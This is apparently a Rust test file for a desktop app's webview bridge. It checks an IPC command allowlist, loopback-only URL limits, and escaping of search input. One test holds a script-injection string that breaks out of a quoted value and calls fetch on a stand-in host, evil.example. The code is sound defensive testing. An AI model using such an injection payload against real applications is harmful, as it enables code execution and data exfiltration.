#![allow(dead_code)]

#[path = "../src/spotlight_bridge.rs"]
mod spotlight_bridge;

use spotlight_bridge::{
    build_spotlight_script, is_allowed_spotlight_command, is_allowed_spotlight_url,
    parse_spotlight_command, SpotlightCommand,
};
use url::Url;

#[test]
fn ipc_boundary_accepts_only_reviewed_commands() {
    assert!(is_allowed_spotlight_command("focus"));
    assert!(is_allowed_spotlight_command("search"));
    assert!(is_allowed_spotlight_command("close"));
    for value in [
        "open",
        "reveal",
        "reindex",
        "shell",
        "fs",
        "search?path=C:\\",
    ] {
        assert!(!is_allowed_spotlight_command(value));
        assert!(parse_spotlight_command(value).is_none());
    }
}

#[test]
fn webview_url_boundary_is_loopback_and_path_scoped() {
    let allowed = Url::parse("http://127.0.0.1:49152/").unwrap();
    assert!(is_allowed_spotlight_url(&allowed, 49152));
    for value in [
        "http://127.0.0.1:49153/",
        "http://localhost:49152/",
        "https://127.0.0.1:49152/",
        "http://127.0.0.1:49152/api/spotlight/search",
        "http://127.0.0.1:49152/?q=private",
    ] {
        assert!(!is_allowed_spotlight_url(
            &Url::parse(value).unwrap(),
            49152
        ));
    }
}

#[test]
fn eval_bridge_does_not_turn_query_data_into_code() {
    let script = build_spotlight_script(
        SpotlightCommand::Search,
        Some(r#"\"}); fetch("https://evil.example"); //"#),
    )
    .unwrap();
    assert!(script.contains("input.value ="));
    assert!(!script.contains("fetch(\"https://evil.example\")"));
}
